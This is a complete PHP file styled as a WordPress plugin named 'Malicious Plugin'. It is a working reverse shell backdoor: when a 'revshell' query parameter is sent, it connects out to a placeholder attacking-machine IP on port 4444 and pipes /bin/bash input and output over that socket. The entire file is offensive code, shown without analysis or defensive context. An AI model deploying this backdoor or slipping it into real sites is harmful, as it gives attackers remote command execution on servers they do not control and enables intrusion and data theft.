<?php
/*
Plugin Name: Malicious Plugin
*/
if (isset($_GET['revshell'])) {
    $ip = '<your_attacking_machine_IP>';
    $port = 4444;
    $sock = fsockopen($ip, $port);
    if ($sock) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open("/bin/bash", $descriptorspec, $pipes);
        if (is_resource($process)) {
            while (!feof($sock)) {
                fwrite($pipes[0], fread($sock, 512));
                $read = array($pipes[1], $pipes[2]);
                $write = NULL;
                $except = NULL;
                $tv_sec = 0;
                $tv_usec = 100000;
                if (stream_select($read, $write, $except, $tv_sec, $tv_usec) > 0) {
                    if (in_array($pipes[1], $read)) {
                        fwrite($sock, fread($pipes[1], 512));
                    } else {
                        fwrite($sock, fread($pipes[2], 512));
                    }
                }
            }
            fclose($sock);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
    }
}
?>